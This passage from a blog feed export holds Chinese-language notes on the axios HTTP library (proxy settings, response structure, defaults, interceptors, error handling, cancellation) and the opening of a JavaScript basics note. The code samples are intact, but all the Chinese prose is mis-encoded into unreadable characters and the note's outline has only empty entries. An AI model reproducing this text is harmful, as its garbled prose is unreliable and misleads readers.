  <span>// è¿™å°†ä¼šè®¾ç½®ä¸€ä¸ª `Proxy-Authorization` å¤´ï¼Œè¦†å†™æ‰å·²æœ‰çš„é€šè¿‡ä½¿ç”¨ `header` è®¾ç½®çš„è‡ªå®šä¹‰ `Proxy-Authorization` å¤´ã€‚</span>
  <span>proxy</span><span>:</span> <span>{</span>
    <span>host</span><span>:</span> <span>'127.0.0.1'</span><span>,</span>
    <span>port</span><span>:</span> <span>9000</span><span>,</span>
    <span>auth</span><span>:</span> <span>{</span>
      <span>username</span><span>:</span> <span>'mikeymike'</span><span>,</span>
      <span>password</span><span>:</span> <span>'rapunz3l'</span>
    <span>}</span>
  <span>}</span><span>,</span>

  <span>// `cancelToken` æŒ‡å®šç”¨äºå–æ¶ˆè¯·æ±‚çš„ cancel token</span>
  <span>// ï¼ˆæŸ¥çœ‹åé¢çš„ Cancellation è¿™èŠ‚äº†è§£æ›´å¤šï¼‰</span>
  <span>cancelToken</span><span>:</span> <span>new</span> <span>CancelToken</span><span>(</span><span>function</span> <span>(</span><span>cancel</span><span>)</span> <span>{</span>
  <span>}</span><span>)</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br><span>47</span><br><span>48</span><br><span>49</span><br><span>50</span><br><span>51</span><br><span>52</span><br><span>53</span><br><span>54</span><br><span>55</span><br><span>56</span><br><span>57</span><br><span>58</span><br><span>59</span><br><span>60</span><br><span>61</span><br><span>62</span><br><span>63</span><br><span>64</span><br><span>65</span><br><span>66</span><br><span>67</span><br><span>68</span><br><span>69</span><br><span>70</span><br><span>71</span><br><span>72</span><br><span>73</span><br><span>74</span><br><span>75</span><br><span>76</span><br><span>77</span><br><span>78</span><br><span>79</span><br><span>80</span><br><span>81</span><br><span>82</span><br><span>83</span><br><span>84</span><br><span>85</span><br><span>86</span><br><span>87</span><br><span>88</span><br><span>89</span><br><span>90</span><br><span>91</span><br><span>92</span><br><span>93</span><br><span>94</span><br><span>95</span><br><span>96</span><br><span>97</span><br><span>98</span><br><span>99</span><br><span>100</span><br><span>101</span><br><span>102</span><br><span>103</span><br><span>104</span><br><span>105</span><br><span>106</span><br><span>107</span><br><span>108</span><br><span>109</span><br><span>110</span><br><span>111</span><br><span>112</span><br><span>113</span><br><span>114</span><br><span>115</span><br><span>116</span><br><span>117</span><br><span>118</span><br><span>119</span><br><span>120</span><br><span>121</span><br><span>122</span><br><span>123</span><br><span>124</span><br><span>125</span><br><span>126</span><br><span>127</span><br><span>128</span><br><span>129</span><br><span>130</span><br><span>131</span><br><span>132</span><br><span>133</span><br></div></div><h3 id="å“åº”ç»“æ„" tabindex="-1"> å“åº”ç»“æ„</h3>
<p>æŸä¸ªè¯·æ±‚çš„å“åº”åŒ…å«ä»¥ä¸‹ä¿¡æ¯</p>
<div><pre><code><span>{</span>
  <span>// `data` ç”±æœåŠ¡å™¨æä¾›çš„å“åº”</span>
  <span>data</span><span>:</span> <span>{</span><span>}</span><span>,</span>

  <span>// `status` æ¥è‡ªæœåŠ¡å™¨å“åº”çš„ HTTP çŠ¶æ€ç </span>
  <span>status</span><span>:</span> <span>200</span><span>,</span>

  <span>// `statusText` æ¥è‡ªæœåŠ¡å™¨å“åº”çš„ HTTP çŠ¶æ€ä¿¡æ¯</span>
  <span>statusText</span><span>:</span> <span>'OK'</span><span>,</span>

  <span>// `headers` æœåŠ¡å™¨å“åº”çš„å¤´</span>
  <span>headers</span><span>:</span> <span>{</span><span>}</span><span>,</span>

   <span>// `config` æ˜¯ä¸ºè¯·æ±‚æä¾›çš„é…ç½®ä¿¡æ¯</span>
  <span>config</span><span>:</span> <span>{</span><span>}</span><span>,</span>
 <span>// 'request'</span>
  <span>// `request` is the request that generated this response</span>
  <span>// It is the last ClientRequest instance in node.js (in redirects)</span>
  <span>// and an XMLHttpRequest instance the browser</span>
  <span>request</span><span>:</span> <span>{</span><span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><p>ä½¿ç”¨ then æ—¶ï¼Œä½ å°†æ¥æ”¶ä¸‹é¢è¿™æ ·çš„å“åº” :</p>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>)</span>
  <span>.</span><span>then</span><span>(</span><span>function</span><span>(</span><span>response</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>data<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>status<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>statusText<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>headers<span>)</span><span>;</span>
    console<span>.</span><span>log</span><span>(</span>response<span>.</span>config<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre></div><p>åœ¨ä½¿ç”¨ catch æ—¶ï¼Œæˆ–ä¼ é€’ rejection callback ä½œä¸º then çš„ç¬¬äºŒä¸ªå‚æ•°æ—¶ï¼Œå“åº”å¯ä»¥é€šè¿‡ error å¯¹è±¡å¯è¢«ä½¿ç”¨ã€‚</p>
<h2 id="åˆ›å»ºå®ä¾‹" tabindex="-1"> åˆ›å»ºå®ä¾‹</h2>
<p>å¯ä»¥ä½¿ç”¨è‡ªå®šä¹‰é…ç½®æ–°å»ºä¸€ä¸ª <strong>axios å®ä¾‹</strong></p>
<p>axios.create([config])</p>
<h3 id="å®ä¾‹æ–¹æ³•" tabindex="-1"> å®ä¾‹æ–¹æ³•</h3>
<p>ä»¥ä¸‹æ˜¯å¯ç”¨çš„å®ä¾‹æ–¹æ³•ã€‚æŒ‡å®šçš„é…ç½®å°†ä¸å®ä¾‹çš„é…ç½®åˆå¹¶</p>
<ul>
<li>axios#request(config)</li>
<li>axios#get(url[, config])</li>
<li>axios#delete(url[, config])</li>
<li>axios#head(url[, config])</li>
<li>axios#options(url[, config])</li>
<li>axios#post(url[, data[, config]])</li>
<li>axios#put(url[, data[, config]])</li>
<li>axios#patch(url[, data[, config]])</li>
</ul>
<h2 id="é…ç½®é»˜è®¤å€¼" tabindex="-1"> é…ç½®é»˜è®¤å€¼</h2>
<p>å¯ä»¥æŒ‡å®šå°†è¢«ç”¨åœ¨å„ä¸ªè¯·æ±‚çš„é…ç½®é»˜è®¤å€¼</p>
<h3 id="å…¨å±€çš„-axios-é»˜è®¤å€¼" tabindex="-1"> å…¨å±€çš„ axios é»˜è®¤å€¼</h3>
<div><pre><code>axios<span>.</span>defaults<span>.</span>baseURL <span>=</span> <span>'https://api.example.com'</span><span>;</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>common<span>[</span><span>'Authorization'</span><span>]</span> <span>=</span> <span>AUTH_TOKEN</span><span>;</span>
axios<span>.</span>defaults<span>.</span>headers<span>.</span>post<span>[</span><span>'Content-Type'</span><span>]</span> <span>=</span> <span>'application/x-www-form-urlencoded'</span><span>;</span>
</code></pre></div><h3 id="å®ä¾‹é»˜è®¤å€¼" tabindex="-1"> å®ä¾‹é»˜è®¤å€¼</h3>
<div><pre><code><span>// Set config defaults when creating the instance</span>
<span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>{</span>
  <span>baseURL</span><span>:</span> <span>'https://api.example.com'</span>
<span>}</span><span>)</span><span>;</span>

<span>// Alter defaults after instance has been created</span>
instance<span>.</span>defaults<span>.</span>headers<span>.</span>common<span>[</span><span>'Authorization'</span><span>]</span> <span>=</span> <span>AUTH_TOKEN</span><span>;</span>
</code></pre></div><h3 id="é…ç½®çš„ä¼˜å…ˆé¡ºåº" tabindex="-1"> é…ç½®çš„ä¼˜å…ˆé¡ºåº</h3>
<p>é…ç½®ä¼šä»¥ä¸€ä¸ªä¼˜å…ˆé¡ºåºè¿›è¡Œåˆå¹¶ã€‚è¿™ä¸ªé¡ºåºæ˜¯ï¼šåœ¨ lib/defaults.js æ‰¾åˆ°çš„åº“çš„é»˜è®¤å€¼ï¼Œç„¶åæ˜¯å®ä¾‹çš„ defaults å±æ€§ï¼Œæœ€åæ˜¯è¯·æ±‚çš„ config å‚æ•°ã€‚åè€…å°†ä¼˜å…ˆäºå‰è€…ã€‚</p>
<h2 id="æ•°æ®å¤„ç†" tabindex="-1"> æ•°æ®å¤„ç†</h2>
<h3 id="æ‹¦æˆªå™¨" tabindex="-1"> æ‹¦æˆªå™¨</h3>
<p>åœ¨è¯·æ±‚æˆ–å“åº”è¢« then æˆ– catch å¤„ç†å‰æ‹¦æˆªå®ƒä»¬</p>
<div><pre><code><span>// æ·»åŠ è¯·æ±‚æ‹¦æˆªå™¨</span>
axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>config</span><span>)</span> <span>{</span>
    <span>// åœ¨å‘é€è¯·æ±‚ä¹‹å‰åšäº›ä»€ä¹ˆ</span>
    <span>return</span> config<span>;</span>
  <span>}</span><span>,</span> <span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>// å¯¹è¯·æ±‚é”™è¯¯åšäº›ä»€ä¹ˆ</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>

<span>// æ·»åŠ å“åº”æ‹¦æˆªå™¨</span>
axios<span>.</span>interceptors<span>.</span>response<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>response</span><span>)</span> <span>{</span>
    <span>// å¯¹å“åº”æ•°æ®åšç‚¹ä»€ä¹ˆ</span>
    <span>return</span> response<span>;</span>
  <span>}</span><span>,</span> <span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>// å¯¹å“åº”é”™è¯¯åšç‚¹ä»€ä¹ˆ</span>
    <span>return</span> Promise<span>.</span><span>reject</span><span>(</span>error<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div><p>å¦‚æœæƒ³åœ¨ç¨åç§»é™¤æ‹¦æˆªå™¨ï¼Œå¯ä»¥è¿™æ ·ï¼š</p>
<div><pre><code><span>const</span> myInterceptor <span>=</span> axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span><span>/*...*/</span><span>}</span><span>)</span><span>;</span>
axios<span>.</span>interceptors<span>.</span>request<span>.</span><span>eject</span><span>(</span>myInterceptor<span>)</span><span>;</span>
</code></pre></div><p>å¯ä»¥ä¸ºè‡ªå®šä¹‰ axios å®ä¾‹æ·»åŠ æ‹¦æˆªå™¨</p>
<div><pre><code><span>const</span> instance <span>=</span> axios<span>.</span><span>create</span><span>(</span><span>)</span><span>;</span>
instance<span>.</span>interceptors<span>.</span>request<span>.</span><span>use</span><span>(</span><span>function</span> <span>(</span><span>)</span> <span>{</span><span>/*...*/</span><span>}</span><span>)</span><span>;</span>
</code></pre></div><h3 id="é”™è¯¯å¤„ç†" tabindex="-1"> é”™è¯¯å¤„ç†</h3>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>)</span>
  <span>.</span><span>catch</span><span>(</span><span>function</span> <span>(</span><span>error</span><span>)</span> <span>{</span>
    <span>if</span> <span>(</span>error<span>.</span>response<span>)</span> <span>{</span>
      <span>// The request was made and the server responded with a status code</span>
      <span>// that falls out of the range of 2xx</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>data<span>)</span><span>;</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>status<span>)</span><span>;</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>response<span>.</span>headers<span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>if</span> <span>(</span>error<span>.</span>request<span>)</span> <span>{</span>
      <span>// The request was made but no response was received</span>
      <span>// `error.request` is an instance of XMLHttpRequest in the browser and an instance of</span>
      <span>// http.ClientRequest in node.js</span>
      console<span>.</span><span>log</span><span>(</span>error<span>.</span>request<span>)</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>// Something happened in setting up the request that triggered an Error</span>
      console<span>.</span><span>log</span><span>(</span><span>'Error'</span><span>,</span> error<span>.</span>message<span>)</span><span>;</span>
    <span>}</span>
    console<span>.</span><span>log</span><span>(</span>error<span>.</span>config<span>)</span><span>;</span>
  <span>}</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br></div></div><p>ä¹Ÿå¯ä»¥ä½¿ç”¨ validateStatus é…ç½®é€‰é¡¹å®šä¹‰ä¸€ä¸ªè‡ªå®šä¹‰ HTTP çŠ¶æ€ç çš„é”™è¯¯èŒƒå›´ã€‚</p>
<div><pre><code>axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>validateStatus</span><span>:</span> <span>function</span> <span>(</span><span>status</span><span>)</span> <span>{</span>
    <span>return</span> status <span>&lt;</span> <span>500</span><span>;</span> <span>// Reject only if the status code is greater than or equal to 500</span>
  <span>}</span>
<span>}</span><span>)</span>
</code></pre></div><h3 id="å–æ¶ˆ" tabindex="-1"> å–æ¶ˆ</h3>
<p>ä½¿ç”¨ cancel token å–æ¶ˆè¯·æ±‚</p>
<blockquote>
<p>Axios çš„ cancel token API åŸºäºcancelable promises proposalï¼Œå®ƒè¿˜å¤„äºç¬¬ä¸€é˜¶æ®µã€‚</p>
</blockquote>
<p>å¯ä»¥ä½¿ç”¨ CancelToken.source å·¥å‚æ–¹æ³•åˆ›å»º cancel tokenï¼Œåƒè¿™æ ·</p>
<div><pre><code><span>const</span> CancelToken <span>=</span> axios<span>.</span>CancelToken<span>;</span>
<span>const</span> source <span>=</span> CancelToken<span>.</span><span>source</span><span>(</span><span>)</span><span>;</span>

axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> source<span>.</span>token
<span>}</span><span>)</span><span>.</span><span>catch</span><span>(</span><span>function</span><span>(</span><span>thrown</span><span>)</span> <span>{</span>
  <span>if</span> <span>(</span>axios<span>.</span><span>isCancel</span><span>(</span>thrown<span>)</span><span>)</span> <span>{</span>
    console<span>.</span><span>log</span><span>(</span><span>'Request canceled'</span><span>,</span> thrown<span>.</span>message<span>)</span><span>;</span>
  <span>}</span> <span>else</span> <span>{</span>
     <span>// å¤„ç†é”™è¯¯</span>
  <span>}</span>
<span>}</span><span>)</span><span>;</span>

axios<span>.</span><span>post</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>name</span><span>:</span> <span>'new name'</span>
<span>}</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> source<span>.</span>token
<span>}</span><span>)</span>

<span>// å–æ¶ˆè¯·æ±‚ï¼ˆmessage å‚æ•°æ˜¯å¯é€‰çš„ï¼‰</span>
source<span>.</span><span>cancel</span><span>(</span><span>'Operation canceled by the user.'</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br></div></div><p>è¿˜å¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ª executor å‡½æ•°åˆ° CancelToken çš„æ„é€ å‡½æ•°æ¥åˆ›å»º cancel tokenï¼š</p>
<div><pre><code><span>const</span> CancelToken <span>=</span> axios<span>.</span>CancelToken<span>;</span>
<span>let</span> cancel<span>;</span>

axios<span>.</span><span>get</span><span>(</span><span>'/user/12345'</span><span>,</span> <span>{</span>
  <span>cancelToken</span><span>:</span> <span>new</span> <span>CancelToken</span><span>(</span><span>function</span> <span>executor</span><span>(</span><span>c</span><span>)</span> <span>{</span>
    <span>// executor å‡½æ•°æ¥æ”¶ä¸€ä¸ª cancel å‡½æ•°ä½œä¸ºå‚æ•°</span>
    cancel <span>=</span> c<span>;</span>
  <span>}</span><span>)</span>
<span>}</span><span>)</span><span>;</span>

<span>// cancel the request</span>
<span>cancel</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br></div></div><p><strong>æ³¨æ„</strong>: å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ª cancel token å–æ¶ˆå¤šä¸ªè¯·æ±‚</p>
]]></content>
    <published>2022-05-16T04:59:52.000Z</published>
  </entry>
  <entry>
    <title type="html">JavaScript</title>
    <id>https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JavaScript.html</id>
    <link href="https://vuepress-theme-hope-v2-demo.mrhope.site/cs-way/notes/%E5%89%8D%E7%AB%AF/JavaScript.html"/>
    <updated>2022-05-16T04:59:52.000Z</updated>
    <content type="html"><![CDATA[
<ul>
<li>
<ul>
<li></li>
</ul>
</li>
<li>
<ul>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li>
<ul>
<li></li>
<li>
<ul>
<li></li>
<li></li>
<li></li>
<li></li>
<li></li>
</ul>
</li>
</ul>
</li>
<li></li>
</ul>

<h1 id="javascript" tabindex="-1"> JavaScript</h1>
<h2 id="javascript-ç®€ä»‹" tabindex="-1"> JavaScript ç®€ä»‹</h2>
<p>JavaScript æ˜¯ä¸€ç§è„šæœ¬ï¼Œä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œå®ƒå¯ä»¥åœ¨ç½‘é¡µä¸Šå®ç°å¤æ‚çš„åŠŸèƒ½ï¼Œç½‘é¡µå±•ç°ç»™ä½ çš„ä¸å†æ˜¯ç®€å•çš„é™æ€ä¿¡æ¯ï¼Œè€Œæ˜¯å®æ—¶çš„å†…å®¹æ›´æ–°ã€‚</p>
<p><strong>JavaScriptè¯­è¨€çš„ä»‹ç»</strong>ï¼šJavaScriptæ˜¯åŸºäºå¯¹è±¡å’ŒåŸå‹çš„ä¸€ç§åŠ¨æ€ã€å¼±ç±»å‹çš„è„šæœ¬è¯­è¨€</p>
<p><strong>JavaScriptè¯­è¨€çš„ç»„æˆ</strong>ï¼šJavaScriptæ˜¯ç”±æ ¸å¿ƒè¯­æ³•(ECMAScript)ã€æ–‡æ¡£å¯¹è±¡æ¨¡å‹(DOM)ã€æµè§ˆå™¨å¯¹è±¡æ¨¡å‹(BOM)ç»„æˆçš„</p>
<h1 id="javascript-è¯­æ³•" tabindex="-1"> JavaScript è¯­æ³•</h1>
<h2 id="åŸºç¡€è¯­æ³•" tabindex="-1"> åŸºç¡€è¯­æ³•</h2>
<h3 id="å˜é‡" tabindex="-1"> å˜é‡</h3>
<p><strong>å˜é‡çš„å£°æ˜</strong></p>
<ul>
<li>varå˜é‡ï¼švar å˜é‡å = å€¼;
<ul>
<li>å­˜åœ¨å˜é‡å£°æ˜æå‰,å¯å£°æ˜åŒåå˜é‡è¦†ç›–ã€‚</li>
</ul>
</li>
<li>letå˜é‡ï¼šlet å˜é‡å = å€¼;
<ul>
<li>å­˜åœ¨æš‚æ—¶æ€§æ­»åŒºï¼Œä¸å­˜åœ¨å˜é‡å£°æ˜æå‰ï¼Œä¸å…è®¸é‡å¤å®šä¹‰</li>
</ul>
</li>
<li>constå˜é‡ï¼šconst å˜é‡å = å€¼;
<ul>
<li>ä½¿ç”¨æ—¶å¿…é¡»åˆå§‹åŒ–(å³å¿…é¡»èµ‹å€¼)ï¼Œå­˜åœ¨æš‚æ—¶æ€§æ­»åŒºï¼Œä¸å­˜åœ¨å˜é‡å£°æ˜æå‰ï¼Œä¸å…è®¸é‡å¤å®šä¹‰</li>
</ul>
</li>
</ul>
<p><strong>æš‚æ—¶æ€§æ­»åŒº</strong>ï¼šåªè¦ä¸€è¿›å…¥å½“å‰ä½œç”¨åŸŸï¼Œæ‰€è¦ä½¿ç”¨çš„å˜é‡å°±å·²ç»å­˜åœ¨äº†ï¼Œä½†æ˜¯ä¸å¯è·å–ï¼Œåªæœ‰ç­‰åˆ°å£°æ˜å˜é‡çš„é‚£ä¸€è¡Œä»£ç å‡ºç°ï¼Œæ‰å¯ä»¥è·å–å’Œä½¿ç”¨è¯¥å˜é‡</p>
<p><strong>å˜é‡å£°æ˜æå‡</strong>ï¼šå˜é‡åœ¨å£°æ˜ä¹‹å‰å°±è®¿é—®ï¼Œvarä¼šä½¿ç”¨é»˜è®¤å€¼undefinedï¼Œè€Œletä¼šç›´æ¥æŠ¥é”™</p>
<p><strong>éšå¼å˜é‡</strong>æ˜¯æŒ‡æ²¡æœ‰ç”¨varï¼Œletï¼Œconstç­‰å…³é”®å­—å®šä¹‰çš„å˜é‡ï¼Œéšå¼å˜é‡æ˜¯ä¸å­˜åœ¨å˜é‡æå‡</p>
<p><strong>å˜é‡å£°æ˜æ–¹å¼åŒºåˆ«</strong></p>
<table>
<thead>
<tr>
<th></th>
<th>var</th>
<th>let</th>
<th>const</th>
</tr>
</thead>
<tbody>
<tr>
<td>æ˜¯å¦å¿…é¡»æ˜¾å¼å£°æ˜</td>
<td>å¦</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>æ˜¯å¦å¯é‡å¤å£°æ˜</td>
<td>æ˜¯</td>
<td>å¦</td>
<td>å¦</td>
</tr>
<tr>
<td>æ˜¯å¦å¯ä¿®æ”¹</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
<td>åŸºæœ¬æ•°æ®ç±»å‹ä¸å¯ï¼Œå¼•ç”¨ç±»å‹å¯ä»¥</td>
</tr>
<tr>
<td>ä½œç”¨åŸŸ</td>
<td>å…¨å±€/å‡½æ•°</td>
<td>å—çº§</td>
<td>å—çº§</td>
</tr>
<tr>
<td>æš‚æ—¶æ€§æ­»åŒº</td>
<td>å¦</td>
<td>æ˜¯</td>
<td>æ˜¯</td>
</tr>
<tr>
<td>å˜é‡æå‡</td>
<td>æ˜¯</td>
<td>å¦</td>
<td>å¦</td>
</tr>
</tbody>
</table>
<h3 id="æ•°æ®ç±»å‹" tabindex="-1"> æ•°æ®ç±»å‹</h3>
<p>æ•°æ®ç±»å‹åˆ¤æ–­ typeof</p>
<p><strong>åŸå§‹ç±»å‹</strong>(åŸºæœ¬ç±»å‹)ï¼šå€¼ä¸å¯å˜(åŸå§‹å€¼)</p>
<ul>
<li>Number è¡¨ç¤ºæ‰€æœ‰çš„æ•°å€¼ç±»å‹ï¼Œæ•°å€¼èŒƒå›´åœ¨(Number.MIN_VALUE~Number.MAX_VALUE)ä¹‹é—´ï¼Œè¶…å‡ºèŒƒå›´ä¼šè‡ªåŠ¨è½¬åŒ–ä¸º[-+]Infinity(æ— ç©·)ï¼ŒNaNæ˜¯ä¸€ä¸ªéæ•°å€¼</li>
<li>String è¡¨ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä»–ç±»å‹å¯ä»¥ä½¿ç”¨toStringæ–¹æ³•è½¬ä¸ºå­—ç¬¦ä¸²</li>
<li>Boolean å¸ƒå°”ç±»å‹ åªæœ‰trueå’Œfalseä¸¤ä¸ªå€¼</li>
<li>Null åªæœ‰ä¸€ä¸ªå€¼nullï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºæŒ‡é’ˆå¯¹è±¡ï¼Œå› æ­¤æˆ‘ä»¬åº”è¯¥å°†ä¿å­˜å¯¹è±¡çš„å˜é‡åˆå§‹åŒ–ä¸ºnull</li>
<li>Undefined æœªå®šä¹‰ï¼ˆå£°æ˜äº†æ˜¯varå˜é‡ï¼Œä½†æ˜¯æ²¡æœ‰èµ‹å€¼çš„æ—¶å€™ï¼‰</li>
<li>Symbolç±»å‹ï¼šè¡¨ç¤ºä¸€ä¸ªç¬¦å·ï¼Œç¬¦å·ç±»å‹æ˜¯å”¯ä¸€çš„å¹¶ä¸”æ˜¯ä¸å¯ä¿®æ”¹çš„</li>
</ul>
<p><strong>å¼•ç”¨ç±»å‹</strong>ï¼šå€¼å¯å˜</p>
<ul>
<li>å¼•ç”¨ç±»å‹æ˜¯ä¸€ç§æ•°æ®ç»“æ„ï¼Œç”¨äºå°†æ•°æ®å’ŒåŠŸèƒ½ç»„ç»‡åœ¨ä¸€èµ·</li>
<li>å¸¸è§å¼•ç”¨ç±»å‹ï¼šå¯¹è±¡ï¼ˆObjectï¼‰ã€æ•°ç»„ï¼ˆArrayï¼‰ã€å‡½æ•°ï¼ˆFunctionï¼‰ã€æ­£åˆ™ï¼ˆRegExpï¼‰å’Œæ—¥æœŸï¼ˆDateï¼‰ç­‰</li>
</ul>
<h3 id="ä½œç”¨åŸŸ" tabindex="-1"> ä½œç”¨åŸŸ</h3>
<p>ä½œç”¨åŸŸï¼ˆscopeï¼‰å°±æ˜¯å˜é‡è®¿é—®è§„åˆ™çš„æœ‰æ•ˆèŒƒå›´ã€‚</p>
<ul>
<li>ä½œç”¨åŸŸå¤–ï¼Œæ— æ³•å¼•ç”¨ä½œç”¨åŸŸå†…çš„å˜é‡ï¼›</li>
<li>ç¦»å¼€ä½œç”¨åŸŸåï¼Œä½œç”¨åŸŸçš„å˜é‡çš„å†…å­˜ç©ºé—´ä¼šè¢«æ¸…é™¤ï¼Œæ¯”å¦‚æ‰§è¡Œå®Œå‡½æ•°æˆ–è€…å…³é—­æµè§ˆå™¨</li>
<li>ä½œç”¨åŸŸä¸æ‰§è¡Œä¸Šä¸‹æ–‡æ˜¯å®Œå…¨ä¸åŒçš„ä¸¤ä¸ªæ¦‚å¿µã€‚</li>
</ul>
<h4 id="æ‰§è¡ŒæœŸä¸Šä¸‹æ–‡" tabindex="-1"> æ‰§è¡ŒæœŸä¸Šä¸‹æ–‡</h4>
<p>å½“å‡½æ•°æ‰§è¡Œæ—¶ï¼Œä¼šåˆ›å»ºä¸€ä¸ªç§°ä¸ºæ‰§è¡ŒæœŸä¸Šä¸‹æ–‡çš„å†…éƒ¨å¯¹è±¡ã€‚ä¸€ä¸ªæ‰§è¡ŒæœŸä¸Šä¸‹æ–‡å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°æ‰§è¡Œæ—¶çš„ç¯å¢ƒï¼Œå‡½æ•°æ¯æ¬¡æ‰§è¡Œæ—¶å¯¹åº”çš„æ‰§è¡Œä¸Šä¸‹æ–‡éƒ½æ˜¯ç‹¬ä¸€æ— äºŒçš„ï¼Œæ‰€ä»¥å¤šæ¬¡è°ƒç”¨ä¸€ä¸ªå‡½æ•°ä¼šå¯¼è‡´åˆ›å»ºå¤šä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ï¼Œå½“å‡½æ•°æ‰§è¡Œå®Œæ¯•ï¼Œæ‰§è¡Œä¸Šä¸‹æ–‡è¢«é”€æ¯ã€‚</p>
<p>JavaScriptä»£ç çš„æ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹ï¼Œåˆ†ä¸ºä¸¤ä¸ªé˜¶æ®µï¼Œä»£ç ç¼–è¯‘é˜¶æ®µä¸ä»£ç æ‰§è¡Œé˜¶æ®µã€‚</p>
<ul>
<li>ç¼–è¯‘é˜¶æ®µç”±ç¼–è¯‘å™¨å®Œæˆï¼Œå°†ä»£ç ç¿»è¯‘æˆå¯æ‰§è¡Œä»£ç ï¼Œè¿™ä¸ªé˜¶æ®µä½œç”¨åŸŸè§„åˆ™ä¼šç¡®å®šã€‚</li>
